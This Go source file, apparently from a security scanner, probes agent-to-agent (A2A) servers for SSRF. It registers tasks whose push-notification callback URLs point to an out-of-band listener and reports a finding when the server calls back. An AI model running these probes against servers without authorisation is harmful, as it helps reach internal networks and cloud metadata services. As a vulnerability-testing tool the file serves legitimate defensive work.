package a2a

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	"github.com/calbebop/batesian/internal/attack"
	"github.com/calbebop/batesian/internal/oob"
)

// PushSSRFExecutor tests whether an A2A server makes outbound HTTP requests to
// attacker-controlled push notification callback URLs (rule a2a-push-ssrf-001).
//
// Attack sequence:
//  1. Start or use an OOB listener.
//  2. Send a task with pushNotificationConfig.url pointing at the OOB listener.
//  3. Wait for an inbound HTTP callback.
//  4. If a callback arrives, SSRF is confirmed.
type PushSSRFExecutor struct {
	rule attack.RuleContext
}

// NewPushSSRFExecutor creates an executor for the push-notification-ssrf attack type.
func NewPushSSRFExecutor(r attack.RuleContext) *PushSSRFExecutor {
	return &PushSSRFExecutor{rule: r}
}

// Execute runs the push-notification SSRF test.
func (e *PushSSRFExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)

	// Determine the OOB listener URL.
	listenerURL := opts.OOBListenerURL
	var listener *oob.Listener
	if listenerURL == "" {
		// Spin up a local listener for this run.
		listener = oob.New()
		var err error
		listenerURL, err = listener.Start()
		if err != nil {
			return nil, fmt.Errorf("push-ssrf: starting OOB listener: %w", err)
		}
		defer func() {
			stopCtx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			defer cancel()
			_ = listener.Stop(stopCtx)
		}()
		vars = attack.NewVars(target, listenerURL)
	}

	client := attack.NewHTTPClient(opts, vars)
	callbackURL := listenerURL + "/batesian-" + vars.RandID
	token := "batesian-" + vars.RandID

	// Try multiple transport bindings and SDK versions.
	// Note: A JSON-RPC error response also contains "id" — we must check !isJSONRPCError
	// to avoid false positives from -32601 Method Not Found responses.
	var taskAccepted bool
	var acceptedBinding string

	a2aHeaders := map[string]string{"A2A-Version": "1.0"}

	// Attempt 1: A2A-sdk v1.0 two-step: SendMessage then CreateTaskPushNotificationConfig
	sendResp, err := client.POST(ctx, vars.BaseURL+"/", a2aHeaders, map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      "batesian-sm-" + vars.RandID,
		"method":  "SendMessage",
		"params": map[string]interface{}{
			"message": map[string]interface{}{
				"role":      1, // USER
				"parts":     []interface{}{map[string]string{"text": "ping"}},
				"messageId": "batesian-" + vars.RandID,
			},
		},
	})
	if err == nil && sendResp.IsSuccess() && !isJSONRPCError(sendResp.Body) {
		// Got a task — try to register push notification config for it
		taskID, _ := extractTaskContext(sendResp.Body)
		if taskID != "" {
			pushResp, pushErr := client.POST(ctx, vars.BaseURL+"/", a2aHeaders, map[string]interface{}{
				"jsonrpc": "2.0",
				"id":      "batesian-push-" + vars.RandID,
				"method":  "CreateTaskPushNotificationConfig",
				"params": map[string]interface{}{
					"taskId":              taskID,
					"pushNotificationUrl": callbackURL,
					"token":               token,
				},
			})
			if pushErr == nil && pushResp.IsSuccess() && !isJSONRPCError(pushResp.Body) {
				taskAccepted = true
				acceptedBinding = "JSONRPC/v1.0-CreateTaskPushNotificationConfig"
			}
		}
	}

	// Attempt 2: Legacy JSONRPC v0.3 tasks/send with embedded pushNotification config
	if !taskAccepted {
		jsonrpcResp, err2 := client.POST(ctx, vars.BaseURL+"/", map[string]string{}, buildJSONRPCRequest(callbackURL, token, vars.RandID))
		if err2 == nil && jsonrpcResp.IsSuccess() && !isJSONRPCError(jsonrpcResp.Body) &&
			jsonrpcResp.ContainsAny(`"result"`) {
			taskAccepted = true
			acceptedBinding = "JSONRPC/v0.3-tasks-send"
		}
	}

	// Attempt 3: HTTP+JSON binding (REST API style, some older deployments)
	if !taskAccepted {
		httpResp, err3 := client.POST(ctx, vars.BaseURL+"/tasks/send", map[string]string{}, buildHTTPTaskRequest(callbackURL, token, vars.RandID))
		if err3 == nil && httpResp.IsSuccess() {
			taskAccepted = true
			acceptedBinding = "HTTP+JSON"
		}
	}

	if !taskAccepted {
		// Target doesn't accept A2A task requests — not a finding, just not applicable.
		return nil, nil
	}

	// Wait for OOB callback.
	var findings []attack.Finding
	if listener != nil {
		cb, received := listener.Wait(ctx, 10*time.Second)
		if received {
			evidence := fmt.Sprintf(
				"Target accepted task with pushNotificationConfig.url=%q (binding: %s)\n"+
					"OOB callback received: %s %s\n"+
					"Callback token echoed: %v",
				callbackURL, acceptedBinding, cb.Method, cb.URL,
				containsToken(cb, token),
			)
			findings = append(findings, attack.Finding{
				RuleID:     e.rule.ID,
				RuleName:   e.rule.Name,
				Severity:   "high",
				Confidence: attack.ConfirmedExploit,
				Title:      "A2A server made outbound request to attacker-controlled push notification URL",
				Description: fmt.Sprintf("The A2A server at %s accepted a task registration with an attacker-controlled "+
					"pushNotificationConfig.url and subsequently sent an outbound HTTP request to %s. "+
					"This enables SSRF into internal networks, cloud metadata services, or private endpoints.",
					target, callbackURL),
				Evidence:    evidence,
				Remediation: e.rule.Remediation,
				TargetURL:   target,
			})
		} else {
			// Task was accepted but no callback received. This is a soft signal —
			// the server may have rejected the callback silently, or the callback
			// fires on task completion which hasn't happened yet.
			// Report as info: task accepted with push config but no callback confirmed.
			findings = append(findings, attack.Finding{
				RuleID:     e.rule.ID,
				RuleName:   e.rule.Name,
				Severity:   "info",
				Confidence: attack.RiskIndicator,
				Title:      "A2A server accepted push notification config but no callback observed",
				Description: fmt.Sprintf("The A2A server accepted a task with pushNotificationConfig.url=%q but no inbound "+
					"callback was received within the timeout. This may be a false negative if the callback fires on task "+
					"completion (which did not occur) or if the server cannot reach this host. Retry with --oob-url "+
					"pointing to a publicly reachable server.",
					callbackURL),
				Evidence:    fmt.Sprintf("Task accepted via %s binding. Callback URL: %s. No callback in 10s.", acceptedBinding, callbackURL),
				Remediation: e.rule.Remediation,
				TargetURL:   target,
			})
		}
	} else {
		// Using external OOB — report task accepted, user must check their OOB server.
		findings = append(findings, attack.Finding{
			RuleID:     e.rule.ID,
			RuleName:   e.rule.Name,
			Severity:   "info",
			Confidence: attack.RiskIndicator,
			Title:      "A2A push notification task accepted with attacker-controlled callback URL",
			Description: fmt.Sprintf("Task submitted with pushNotificationConfig.url=%q (binding: %s). "+
				"Check your OOB server at %s for inbound callbacks to confirm SSRF.",
				callbackURL, acceptedBinding, opts.OOBListenerURL),
			Evidence:    fmt.Sprintf("Task accepted via %s. Callback URL: %s", acceptedBinding, callbackURL),
			Remediation: e.rule.Remediation,
			TargetURL:   target,
		})
	}
	return findings, nil
}

// buildJSONRPCRequest creates the A2A task/send request body for JSONRPC binding.
// Includes both pushNotificationConfig (v1.0 spec) and pushNotification (v0.3 legacy)
// to maximize compatibility with real-world deployments.
func buildJSONRPCRequest(callbackURL, token, taskID string) map[string]interface{} {
	pushConfig := map[string]string{"url": callbackURL, "token": token}
	return map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      "batesian-" + taskID,
		"method":  "tasks/send",
		"params": map[string]interface{}{
			"id": "batesian-" + taskID,
			"message": map[string]interface{}{
				"role": "user",
				"parts": []interface{}{
					map[string]string{"type": "text", "text": "ping"},
				},
			},
			// v1.0 spec field name
			"pushNotificationConfig": pushConfig,
			// v0.3 legacy field name (some deployed servers use this)
			"pushNotification": pushConfig,
		},
	}
}

// buildHTTPTaskRequest creates the A2A task/send request body for HTTP+JSON binding.
func buildHTTPTaskRequest(callbackURL, token, taskID string) map[string]interface{} {
	pushConfig := map[string]string{"url": callbackURL, "token": token}
	return map[string]interface{}{
		"id": "batesian-" + taskID,
		"message": map[string]interface{}{
			"role": "user",
			"parts": []interface{}{
				map[string]string{"type": "text", "text": "ping"},
			},
		},
		"pushNotificationConfig": pushConfig,
		"pushNotification":       pushConfig,
	}
}

// containsToken checks if the callback headers or body contain the push token.
func containsToken(cb *oob.Callback, token string) bool {
	for _, vals := range cb.Headers {
		for _, v := range vals {
			if v == token {
				return true
			}
		}
	}
	// Check body
	var m map[string]interface{}
	if err := json.Unmarshal(cb.Body, &m); err == nil {
		b, _ := json.Marshal(m)
		return contains(string(b), token)
	}
	return contains(string(cb.Body), token)
}

func contains(s, substr string) bool {
	return len(s) > 0 && len(substr) > 0 && (s == substr || len(s) >= len(substr) &&
		func() bool {
			for i := 0; i <= len(s)-len(substr); i++ {
				if s[i:i+len(substr)] == substr {
					return true
				}
			}
			return false
		}())
}
